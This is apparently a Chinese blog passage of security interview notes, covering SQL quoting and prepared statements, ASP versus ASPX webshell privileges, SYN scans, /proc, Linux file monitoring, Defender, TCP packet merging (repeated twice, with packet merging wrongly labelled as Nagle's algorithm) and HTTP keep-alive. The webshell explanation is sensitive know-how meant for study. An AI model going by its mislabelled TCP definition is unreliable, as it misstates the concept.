<p>为了正确地处理包含特殊字符的列名或表名，标准的做法是使用**反引号（&#96;）<strong>或</strong>双引号（”）**将这些标识符括起来。不同的数据库系统有不同的规定：</p>
<ul>
<li><p><strong>MySQL</strong>：使用<strong>反引号（&#96;）</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="keyword">user</span><span class="operator">-</span>name` <span class="keyword">FROM</span> `<span class="keyword">user</span><span class="string">&#x27;s_data` WHERE id = 1;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>PostgreSQL、Oracle、SQL Server</strong>：使用<strong>双引号（”）</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;user-name&quot; <span class="keyword">FROM</span> &quot;user&#x27;s_data&quot; <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>注意</strong>：这种引用方法只用于处理<strong>数据库对象名</strong>，不应用于处理<strong>用户输入数据</strong></p>
<hr>
<h3 id="为什么-aspx-木马的权限会比-asp-木马的权限更高"><a href="#为什么-aspx-木马的权限会比-asp-木马的权限更高" class="headerlink" title="为什么 aspx 木马的权限会比 asp 木马的权限更高"></a>为什么 aspx 木马的权限会比 asp 木马的权限更高</h3><p><strong>ASP 木马的权限 (老式技术)</strong></p>
<p>早期的 <strong>ASP</strong> 技术，在 IIS 中运行时，通常会使用一个叫做 <code>IUSR</code> 的匿名用户账户</p>
<ul>
<li><strong>账户权限低</strong>：<code>IUSR</code> 账户的权限被严格限制，它只能访问一些特定的文件和目录，比如网站的根目录</li>
<li><strong>执行后果</strong>：如果你上传一个 ASP 木马并成功执行，这个木马的所有操作都将以 <code>IUSR</code> 的权限进行。它可能能读取或写入网站目录里的文件，但无法访问系统核心文件，也无法创建新的系统管理员账户</li>
<li><strong>总结</strong>：ASP 木马的危害被<strong>账户权限</strong>牢牢限制在了一个较低的水平</li>
</ul>
<p><strong>ASP.NET (ASPX) 木马的权限 (新式技术)</strong></p>
<p><strong>ASP.NET</strong> 是微软推出的新一代 Web 技术，它采用了更现代的权限管理模型：<strong>应用程序池 (Application Pool)</strong>。</p>
<p>每个 ASP.NET 应用都运行在一个独立的应用程序池中，而每个应用程序池都使用一个特定的<strong>账户身份</strong>来运行</p>
<p>这个身份决定了它的权限！！！</p>
<p>问题就出在这里：</p>
<ul>
<li><p><strong>默认配置（安全）</strong>：在现代 IIS 中，应用程序池的默认身份是 <code>ApplicationPoolIdentity</code>。这是一个非常安全的低权限账户，它的权限和 ASP 的 <code>IUSR</code> 账户类似，甚至更低。在这种情况下，ASP.NET 木马的权限也很低，无法造成太大危害</p>
</li>
<li><p><strong>错误配置（危险）</strong>：出于某些历史或方便的原因，一些管理员为了解决权限问题，会<strong>手动将应用程序池的身份更改为高权限账户</strong>，最常见的就是 <code>SYSTEM</code> 账户</p>
<ul>
<li><strong><code>SYSTEM</code> 账户</strong>：这是 Windows 操作系统中<strong>权限最高的本地账户</strong>。它几乎可以执行任何操作，包括读写系统核心文件、创建新的管理员、停止或启动系统服务等</li>
<li><strong>执行后果</strong>：如果攻击者上传的 ASP.NET 木马恰好运行在一个配置为 <code>SYSTEM</code> 账户的应用程序池中，那么这个木马就会<strong>继承 <code>SYSTEM</code> 的所有权限</strong>。此时，它将拥有对整个服务器的完全控制权，可以为所欲为</li>
</ul>
<hr>
<h3 id="有哪些-SQL-语句无法使用预编译的方式"><a href="#有哪些-SQL-语句无法使用预编译的方式" class="headerlink" title="有哪些 SQL 语句无法使用预编译的方式"></a>有哪些 SQL 语句无法使用预编译的方式</h3></li>
</ul>
<p><strong>1. 动态的数据库对象名称</strong></p>
<p>预编译的参数只能用于替换 SQL 语句中的<strong>值</strong>（<code>VALUES</code>），而不能用于替换<strong>表名</strong>、<strong>列名</strong>、<strong>排序字段</strong>（<code>ORDER BY</code>）或<strong>数据库名</strong></p>
<p>例如，你不能这样做：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的预编译用法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM ? WHERE id = 1&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">pstmt.setString(<span class="number">1</span>, <span class="string">&quot;users&quot;</span>); <span class="comment">// 无法将表名作为参数传入</span></span><br></pre></td></tr></table></figure>

<p><strong>2. 动态的 SQL 关键词或子句</strong></p>
<p>像 <code>SELECT</code>、<code>FROM</code>、<code>WHERE</code>、<code>GROUP BY</code>、<code>ORDER BY </code>等 SQL 关键词或整个子句都无法作为参数传入</p>
<p>例如，如果你想根据用户输入动态改变排序规则，你不能这样做：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的预编译用法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM products ORDER BY ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">pstmt.setString(<span class="number">1</span>, <span class="string">&quot;price DESC&quot;</span>); <span class="comment">// 无法将排序规则作为参数传入</span></span><br></pre></td></tr></table></figure>

<p><strong>3. 动态的 <code>IN</code> 子句中的值列表</strong></p>
<p><code>IN</code> 子句中的值列表长度是可变的，预编译的占位符数量是固定的。因此，你不能直接将整个列表作为参数传入</p>
<p>例如，如果你想查询多个ID的用户，不能这样做：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的预编译用法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE id IN (?)&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">pstmt.setString(<span class="number">1</span>, <span class="string">&quot;101, 102, 103&quot;</span>); <span class="comment">// 字符串“101, 102, 103”会被当作一个值</span></span><br></pre></td></tr></table></figure>

<p><strong>正确的做法：动态生成占位符</strong></p>
<p>对于这种情况，你需要在代码中根据用户输入的列表动态生成相应数量的占位符</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的做法</span></span><br><span class="line">List&lt;Integer&gt; userIds = getUserIdsFromInput(); <span class="comment">// 假设用户输入：101, 102, 103</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sqlBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;SELECT * FROM users WHERE id IN (&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; userIds.size(); i++) &#123;</span><br><span class="line">    sqlBuilder.append(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (i &lt; userIds.size() - <span class="number">1</span>) &#123;</span><br><span class="line">        sqlBuilder.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sqlBuilder.append(<span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> sqlBuilder.toString(); <span class="comment">// 生成的SQL：SELECT * FROM users WHERE id IN (?, ?, ?)</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; userIds.size(); i++) &#123;</span><br><span class="line">    pstmt.setInt(i + <span class="number">1</span>, userIds.get(i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery();</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="SYN-开放链接原理"><a href="#SYN-开放链接原理" class="headerlink" title="SYN 开放链接原理"></a>SYN 开放链接原理</h3><p>SYN 扫描的原理是基于 <strong>TCP（传输控制协议）三次握手</strong> 的过程，但它并不会完成完整的三次握手</p>
<ol>
<li><strong>发送 SYN 包</strong>：渗透测试工具（如 Nmap）向目标主机的特定端口发送一个 <strong>SYN（同步）</strong> 数据包。这个包的作用是发起一个连接请求</li>
<li><strong>接收 SYN&#x2F;ACK 包</strong>：<ul>
<li>如果目标主机的端口处于 <strong>开放（Open）</strong> 状态，它会响应一个 <strong>SYN&#x2F;ACK（同步&#x2F;确认）</strong> 数据包，表示它接受了连接请求，并准备好进行下一步的确认</li>
<li>如果端口处于 <strong>关闭（Closed）</strong> 状态，目标主机通常会响应一个 <strong>RST（复位）</strong> 数据包，表示拒绝连接</li>
<li>如果端口被防火墙过滤（<strong>Filtered</strong>），可能不会有任何响应，或者收到一个 ICMP（Internet 控制消息协议）的“目标不可达”消息</li>
</ul>
</li>
<li><strong>发送 RST 包</strong>：这是 SYN 扫描最关键的一步。在收到 SYN&#x2F;ACK 包后，渗透测试工具并不会像正常连接那样发送最终的 ACK 包来完成三次握手。相反，它会立即发送一个 <strong>RST（复位）</strong> 数据包来终止连接</li>
</ol>
<hr>
<h3 id="了解-Linux-proc-目录吗"><a href="#了解-Linux-proc-目录吗" class="headerlink" title="了解 Linux &#x2F;proc 目录吗"></a>了解 Linux &#x2F;proc 目录吗</h3><p><strong><code>/proc</code> 目录的主要作用</strong></p>
<p><code>/proc</code> 目录主要用于以下几个方面：</p>
<ol>
<li><strong>进程信息</strong>：这是它最重要的功能。每个正在运行的进程都有一个以其<strong>进程 ID (PID)</strong> 命名的子目录。例如，PID 为 <code>1234</code> 的进程，其所有信息都存放在 <code>/proc/1234/</code> 目录下</li>
<li><strong>系统信息</strong>：它提供了大量关于系统硬件和内核状态的信息</li>
<li><strong>内核参数调优</strong>：通过修改 <code>/proc/sys/</code> 目录下的文件，你可以动态地调整内核参数，而无需重启系统</li>
</ol>
<p><strong>常见的 <code>/proc</code> 子目录和文件</strong></p>
<p>下面详细介绍一些在应急响应和系统管理中特别常用的文件和目录</p>
<p><strong>1. 进程相关的目录：<code>/proc/&lt;PID&gt;/</code></strong></p>
<ul>
<li><code>/proc/&lt;PID&gt;/cmdline</code>: 存储进程的完整启动命令，包括所有参数。这对于识别可疑进程非常有用</li>
<li><code>/proc/&lt;PID&gt;/exe</code>: 一个指向进程可执行文件的符号链接。通过 <code>ls -l</code> 可以看到它实际指向的文件路径，比如 <code>/usr/bin/nginx</code></li>
<li><code>/proc/&lt;PID&gt;/cwd</code>: 指向进程的当前工作目录</li>
<li><code>/proc/&lt;PID&gt;/fd/</code>: 存放了该进程所有打开的文件描述符的符号链接。我之前提到的 <code>ls -l /proc/&lt;PID&gt;/fd/</code> 命令就是在这里工作的。通过它你可以迅速定位进程打开了哪些文件和网络连接</li>
<li><code>/proc/&lt;PID&gt;/status</code>: 提供了更详细的进程状态信息，比如进程名、父进程ID、内存使用情况（<code>VmSize</code>）、进程权限（<code>Uid</code>）</li>
</ul>
<p><strong>2. 系统信息文件</strong></p>
<ul>
<li><code>/proc/cpuinfo</code>: 包含CPU的详细信息，如型号、核心数、缓存大小等</li>
<li><code>/proc/meminfo</code>: 显示系统内存使用情况，包括总内存、可用内存、缓冲区和缓存</li>
<li><code>/proc/version</code>: 包含Linux内核版本信息</li>
<li><code>/proc/mounts</code>: 包含了当前系统中所有已挂载的文件系统，包括设备、挂载点、文件系统类型和挂载选项</li>
</ul>
<p><strong>3. 内核参数文件：<code>/proc/sys/</code></strong></p>
<p>这个目录允许你查看和修改内核的运行时参数</p>
<ul>
<li><code>/proc/sys/net/ipv4/ip_forward</code>: 控制 IPv4 数据包转发功能。值为 <code>1</code> 表示开启路由，<code>0</code> 表示关闭</li>
<li><code>/proc/sys/fs/file-max</code>: 控制系统范围内可以打开的最大文件句柄数</li>
<li><code>/proc/sys/kernel/hostname</code>: 显示或设置系统主机名</li>
</ul>
<p>你可以用 <code>echo</code> 命令来修改这些参数，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 这种修改是临时的，系统重启后会失效。如果需要永久生效，应该修改 <code>/etc/sysctl.conf</code> 文件</p>
<hr>
<h3 id="如何监控-Linux-文件操"><a href="#如何监控-Linux-文件操" class="headerlink" title="如何监控 Linux 文件操"></a>如何监控 Linux 文件操</h3><p><strong>1. Auditd</strong></p>
<p><strong><code>Auditd</code></strong> 是 Linux 内核提供的、功能最强大且最专业的审计工具。它可以记录几乎所有的系统调用，包括文件读、写、执行等操作，并能根据规则进行过滤。</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>全面而精准</strong>：可以精确地监控指定用户、指定目录或特定系统调用</li>
<li><strong>安全性高</strong>：即使系统被入侵，攻击者也很难篡改 <code>auditd</code> 的日志</li>
<li><strong>可配置性强</strong>：可以通过规则文件（<code>/etc/audit/audit.rules</code>）自定义监控策略。</li>
</ul>
<p><strong>如何使用：</strong></p>
<ol>
<li><p><strong>安装</strong>：大多数发行版默认已安装。如果没有，可以通过 <code>yum install audit</code> 或 <code>apt-get install auditd</code> 来安装</p>
</li>
<li><p><strong>添加监控规则</strong>：</p>
<ul>
<li><p>监控 <code>/etc/</code> 目录下所有文件的写入、修改和权限变更：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -w /etc/ -p wa -k etc_changes</span><br></pre></td></tr></table></figure>
</li>
<li><p>监控所有对 <code>rm</code> 命令的调用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -a always,<span class="built_in">exit</span> -F <span class="built_in">arch</span>=b64 -S <span class="built_in">unlink</span> -S unlinkat -k file_deletion</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>查看日志</strong>：日志默认存放在 <code>/var/log/audit/audit.log</code>，可以使用 <code>ausearch</code> 和 <code>aureport</code> 等工具进行查询和分析</p>
</li>
</ol>
<p><strong>适用场景：</strong></p>
<ul>
<li><strong>安全审计</strong>：监控关键系统文件和目录，确保符合安全合规要求</li>
<li><strong>事后取证</strong>：当发生安全事件时，可以从日志中追踪攻击者的文件操作行为</li>
</ul>
<p><strong>2. inotifywait</strong></p>
<p><code>inotify</code> 是 Linux 内核提供的文件系统事件监控接口，而 <strong><code>inotifywait</code></strong> 是一个命令行工具，它利用这个接口实时监控文件或目录的事件，比如创建、删除、修改等</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>实时性</strong>：可以实时监控文件系统的变化</li>
<li><strong>轻量级</strong>：安装和使用都很简单，对系统资源占用很小</li>
<li><strong>精确监控</strong>：可以监控特定的事件类型</li>
</ul>
<p><strong>如何使用：</strong></p>
<ol>
<li><p><strong>安装</strong>：<code>yum install inotify-tools</code> 或 <code>apt-get install inotify-tools</code></p>
</li>
<li><p><strong>开始监控</strong>：</p>
<ul>
<li><p>实时监控 <code>/tmp</code> 目录下的创建、删除、移动和写入操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inotifywait -m -r -e create,delete,move,modify /tmp/</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-m</code>：持续监控</p>
</li>
<li><p><code>-r</code>：递归监控子目录</p>
</li>
<li><p><code>-e</code>：指定要监控的事件</p>
</li>
</ul>
</li>
</ol>
<p><strong>适用场景：</strong></p>
<ul>
<li><strong>脚本化监控</strong>：可以轻松地集成到 shell 脚本中，当发生特定文件操作时，自动触发报警或执行其他操作</li>
<li><strong>快速排查问题</strong>：例如，某个应用程序突然写入了大量日志文件，你可以用 <code>inotifywait</code> 来快速定位是哪个文件被修改了</li>
</ul>
<p><strong>3. FIM 工具</strong></p>
<p><strong>FIM</strong> 工具，如 <strong>Tripwire</strong> 和 <strong>AIDE</strong>（Advanced Intrusion Detection Environment），通过定期计算文件的哈希值（如 SHA256），来监控文件的完整性。如果哈希值发生变化，则说明文件被修改</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>强大的事后取证能力</strong>：能够准确地识别出哪些文件在何时被修改</li>
<li><strong>防御篡改</strong>：可以检测到攻击者对系统文件、恶意软件的篡改</li>
</ul>
<p><strong>如何使用（以 AIDE 为例）：</strong></p>
<ol>
<li><p><strong>安装</strong>：<code>yum install aide</code> 或 <code>apt-get install aide</code></p>
</li>
<li><p><strong>创建基线数据库</strong>：在系统干净时运行，生成文件的哈希值数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aide --init</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>移动数据库</strong>：将生成的 <code>aide.db.new.gz</code> 文件改名为 <code>aide.db.gz</code> 并移动到安全位置</p>
</li>
<li><p><strong>定期检查</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aide --check</span><br></pre></td></tr></table></figure>

<p>这会与基线数据库进行对比，并报告所有变更</p>
</li>
</ol>
<p><strong>适用场景：</strong></p>
<ul>
<li><strong>系统加固</strong>：定期检查关键系统文件（如 <code>/etc</code>、<code>/bin</code>）是否被非法修改</li>
<li><strong>入侵检测</strong>：当怀疑系统被入侵时，FIM 工具能迅速找出被篡改的文件</li>
</ul>
<hr>
<h3 id="Windows-Defender-安全机制"><a href="#Windows-Defender-安全机制" class="headerlink" title="Windows Defender 安全机制"></a>Windows Defender 安全机制</h3><p><strong>1. 实时保护</strong></p>
<p>这是最基础也是最重要的功能。它会持续监控你的系统，检查你打开、下载或运行的每一个文件和程序。如果发现任何可疑行为或已知的恶意软件，它会立即阻止并隔离威胁</p>
<p><strong>2. 云端保护</strong></p>
<p>这是 Defender 现代化的关键。当一个新文件被发现时，Defender 会快速将它的哈希值发送到微软的智能安全图谱 (Microsoft Intelligent Security Graph)。这个庞大的数据库包含了来自全球数十亿台设备的威胁情报。如果这个文件已经被识别为恶意，Defender 会在<strong>毫秒级</strong>的时间内做出响应，阻止威胁。即使是一个全新的、未知的病毒，如果它的行为模式与已知的恶意软件相似，云端也会快速分析并标记它</p>
<p><strong>3. 行为监控</strong></p>
<p>Defender 不仅仅依赖签名库。它还会监控程序的<strong>行为</strong>。例如，如果一个正常程序突然开始尝试修改系统关键文件、加密你的个人文件（勒索软件的典型行为），或者尝试进行网络连接，Defender 就会将其标记为可疑并阻止。这种机制可以有效防御那些没有被病毒库收录的“零日漏洞”攻击。</p>
<p><strong>4. 防火墙与网络保护</strong></p>
<p>Windows Defender 防火墙是另一道重要的防线。它可以控制进出你电脑的所有网络流量。你可以设置规则来允许或阻止特定程序访问网络，从而防止恶意软件与外部服务器进行通信，或者阻止黑客从外部入侵你的系统</p>
<hr>
<h3 id="什么是-TCP-粘包-拆包"><a href="#什么是-TCP-粘包-拆包" class="headerlink" title="什么是 TCP 粘包&#x2F;拆包"></a>什么是 TCP 粘包&#x2F;拆包</h3><p><strong>什么是 TCP 粘包？</strong></p>
<p><strong>TCP 粘包 (Nagle’s Algorithm)</strong> 指的是发送方发送的多个数据包，在接收端看起来就像是一个大的数据包。简单来说，就是多个独立的报文被“粘”在一起了</p>
<p>这通常发生在以下情况：</p>
<ul>
<li><strong>发送方发送频率快，数据量小</strong>：当发送方以极快的速度发送多个小数据包时，TCP 协议的 <strong>Nagle 算法</strong>会为了提高网络利用率，将这些小数据包缓存起来，直到积累到一定大小或者收到接收方的 ACK 确认后，才一次性发送出去</li>
<li><strong>接收方读取速度慢</strong>：当接收方应用程序从缓冲区读取数据时，如果一次性读取了多个数据包，就会发生粘包</li>
</ul>
<p><strong>举个例子：</strong></p>
<p>假设客户端连续发送了两个数据包，内容分别是 <code>“Hello”</code> 和 <code>“World”</code></p>
<ol>
<li>发送方将 <code>“Hello”</code> 发送出去</li>
<li>发送方很快又发送 <code>“World”</code>，但此时网络可能拥塞，或 Nagle 算法正在等待</li>
<li>TCP 将这两个数据包合并，一次性发送给接收方</li>
<li>接收方在接收缓冲区中收到的是 <code>“HelloWorld”</code></li>
</ol>
<p>接收端的应用程序在读取时，无法区分出这是两个独立的消息，因此造成了<strong>粘包</strong>问题</p>
<p><strong>什么是 TCP 拆包？</strong></p>
<p><strong>TCP 拆包</strong>与粘包相反，指的是一个完整的数据包被拆分成多个小数据包进行发送</p>
<p>这通常发生在以下情况：</p>
<ul>
<li><strong>发送的数据包过大</strong>：当发送的数据包超过 TCP 缓冲区的最大值时，TCP 会自动将其拆分为多个数据包进行传输</li>
<li><strong>网络传输过程中出现拥塞</strong>：网络拥塞时，路由器或防火墙可能会对数据包进行分片（fragmentation）。</li>
</ul>
<p><strong>举个例子：</strong></p>
<p>假设客户端发送了一个 2000 字节的数据包，但网络 MTU（最大传输单元）是 1500 字节</p>
<ol>
<li>发送方将 2000 字节的数据包拆分为两个数据包：第一个 1500 字节，第二个 500 字节</li>
<li>接收方在接收缓冲区中先收到 1500 字节的数据，然后又收到 500 字节的数据</li>
</ol>
<p>接收端应用程序在读取时，可能只读取到一部分数据，导致无法获得一个完整的消息，从而造成<strong>拆包</strong>问题</p>
<hr>
<h3 id="什么是-TCP-粘包-拆包-1"><a href="#什么是-TCP-粘包-拆包-1" class="headerlink" title="什么是 TCP 粘包&#x2F;拆包"></a>什么是 TCP 粘包&#x2F;拆包</h3><p><strong>什么是 TCP 粘包？</strong></p>
<p><strong>TCP 粘包 (Nagle’s Algorithm)</strong> 指的是发送方发送的多个数据包，在接收端看起来就像是一个大的数据包。简单来说，就是多个独立的报文被“粘”在一起了</p>
<p>这通常发生在以下情况：</p>
<ul>
<li><strong>发送方发送频率快，数据量小</strong>：当发送方以极快的速度发送多个小数据包时，TCP 协议的 <strong>Nagle 算法</strong>会为了提高网络利用率，将这些小数据包缓存起来，直到积累到一定大小或者收到接收方的 ACK 确认后，才一次性发送出去</li>
<li><strong>接收方读取速度慢</strong>：当接收方应用程序从缓冲区读取数据时，如果一次性读取了多个数据包，就会发生粘包</li>
</ul>
<p><strong>举个例子：</strong></p>
<p>假设客户端连续发送了两个数据包，内容分别是 <code>“Hello”</code> 和 <code>“World”</code></p>
<ol>
<li>发送方将 <code>“Hello”</code> 发送出去</li>
<li>发送方很快又发送 <code>“World”</code>，但此时网络可能拥塞，或 Nagle 算法正在等待</li>
<li>TCP 将这两个数据包合并，一次性发送给接收方</li>
<li>接收方在接收缓冲区中收到的是 <code>“HelloWorld”</code></li>
</ol>
<p>接收端的应用程序在读取时，无法区分出这是两个独立的消息，因此造成了<strong>粘包</strong>问题</p>
<p><strong>什么是 TCP 拆包？</strong></p>
<p><strong>TCP 拆包</strong>与粘包相反，指的是一个完整的数据包被拆分成多个小数据包进行发送</p>
<p>这通常发生在以下情况：</p>
<ul>
<li><strong>发送的数据包过大</strong>：当发送的数据包超过 TCP 缓冲区的最大值时，TCP 会自动将其拆分为多个数据包进行传输</li>
<li><strong>网络传输过程中出现拥塞</strong>：网络拥塞时，路由器或防火墙可能会对数据包进行分片（fragmentation）。</li>
</ul>
<p><strong>举个例子：</strong></p>
<p>假设客户端发送了一个 2000 字节的数据包，但网络 MTU（最大传输单元）是 1500 字节</p>
<ol>
<li>发送方将 2000 字节的数据包拆分为两个数据包：第一个 1500 字节，第二个 500 字节</li>
<li>接收方在接收缓冲区中先收到 1500 字节的数据，然后又收到 500 字节的数据</li>
</ol>
<p>接收端应用程序在读取时，可能只读取到一部分数据，导致无法获得一个完整的消息，从而造成<strong>拆包</strong>问题</p>
<hr>
<h3 id="HTTP-长连接和短连接的区别"><a href="#HTTP-长连接和短连接的区别" class="headerlink" title="HTTP 长连接和短连接的区别"></a>HTTP 长连接和短连接的区别</h3><p><strong>什么是 HTTP 短连接？</strong></p>
<p><strong>HTTP 短连接</strong>指的是浏览器和服务器每进行一次 HTTP 操作（如获取一个 HTML 文件、一张图片或一个 CSS 文件），就建立一次 TCP 连接，传输完毕后立即断开连接</p>
<p><strong>工作流程：</strong></p>
<ol>
<li><strong>建立连接</strong>：客户端（浏览器）向服务器发起 TCP 连接（三次握手）</li>
<li><strong>发送请求</strong>：客户端发送 HTTP 请求</li>
<li><strong>发送响应</strong>：服务器发送 HTTP 响应</li>
<li><strong>断开连接</strong>：服务器和客户端立即断开 TCP 连接（四次挥手）</li>
<li><strong>重复</strong>：如果客户端还需要请求其他资源，就必须重复上述所有步骤</li>
</ol>
<p><strong>特点：</strong></p>
<ul>
<li><strong>优点</strong>：实现简单，服务器在请求处理完毕后立即释放资源，适合请求频率较低的场景</li>
<li><strong>缺点</strong>：<ul>
<li><strong>性能开销大</strong>：每次请求都需要经过 TCP 三次握手和四次挥手，这会增加大量的网络延迟</li>
<li><strong>资源消耗高</strong>：大量的连接建立和断开操作会消耗服务器和客户端的 CPU 和内存资源</li>
</ul>
</li>
</ul>
<p><strong>什么是 HTTP 长连接？</strong></p>
<p><strong>HTTP 长连接</strong>（也称作 <strong>HTTP Keep-Alive</strong> 或 <strong>HTTP Persistent Connection</strong>）指的是浏览器和服务器建立 TCP 连接后，在一次请求&#x2F;响应完成后，不会立即断开连接，而是保持连接状态。后续的请求和响应可以在这个已建立的连接上继续进行</p>
<p><strong>工作流程：</strong></p>
<ol>
<li><strong>建立连接</strong>：客户端向服务器发起 TCP 连接（三次握手）</li>
<li><strong>发送请求</strong>：客户端发送 HTTP 请求</li>
<li><strong>发送响应</strong>：服务器发送 HTTP 响应</li>
<li><strong>保持连接</strong>：连接保持打开状态</li>
<li><strong>重复</strong>：客户端继续在这个连接上发送下一个请求，直到客户端或服务器决定关闭连接</li>
<li><strong>断开连接</strong>：当某个条件满足时（例如达到超时时间或请求数量上限），连接才会断开</li>
</ol>
<p><strong>特点：</strong></p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>性能更高</strong>：省去了大量的 TCP 连接建立和断开的开销，显著减少了网络延迟</li>
<li><strong>资源利用率高</strong>：减少了服务器的 CPU 和内存资源消耗</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>资源占用</strong>：服务器需要为每个活跃的连接维护状态，如果连接数量过多，可能会占用大量服务器资源</li>
<li><strong>实现复杂</strong>：服务器端需要更精细的超时管理机制</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>短连接 (Non-Persistent)</th>
<th>长连接 (Persistent)</th>
</tr>
</thead>
<tbody><tr>
<td>连接管理</td>
<td>一次请求&#x2F;响应后立即断开</td>
<td>保持连接，重复利用</td>
</tr>
<tr>
<td>TCP 开销</td>
<td>高（每次请求都需建立&#x2F;断开）</td>
<td>低（只在首次建立和最后断开）</td>
</tr>
<tr>
<td>性能</td>
<td>低，网络延迟高</td>
<td>高，传输效率更高</td>
</tr>
<tr>
<td>应用场景</td>
<td>访问频率低的静态网页</td>
<td>频繁请求、动态内容多的网站，如电商、社交媒体</td>
</tr>
<tr>
<td>HTTP 版本</td>
<td>HTTP&#x2F;1.0 默认</td>
<td>HTTP&#x2F;1.1 默认开启</td>
</tr>
</tbody></table>
<hr>
<h3 id="Xrange-和-range-返回的是什么"><a href="#Xrange-和-range-返回的是什么" class="headerlink" title="Xrange() 和 range() 返回的是什么"></a>Xrange() 和 range() 返回的是什么</h3><p><strong><code>range</code></strong></p>
<p>在 Python 2 中，<code>range()</code> 函数返回一个<strong>列表（list）</strong>。它会立即生成所有数字，并将它们存储在内存中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 2</span></span><br><span class="line">my_list = <span class="built_in">range</span>(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span> my_list</span><br><span class="line"><span class="comment"># 输出: [0, 1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>

<p><strong>优点：</strong></p>
<ul>
<li>它可以直接用于索引和切片，因为返回的是一个列表</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>内存消耗大</strong>：如果你需要生成一个非常大的数字序列（例如 <code>range(1000000000)</code>），它会占用大量的内存，可能导致程序崩溃或运行缓慢</li>
<li><strong>速度慢</strong>：生成大列表需要时间，这会影响程序的启动速度</li>
</ul>
<p><strong><code>xrange</code></strong></p>
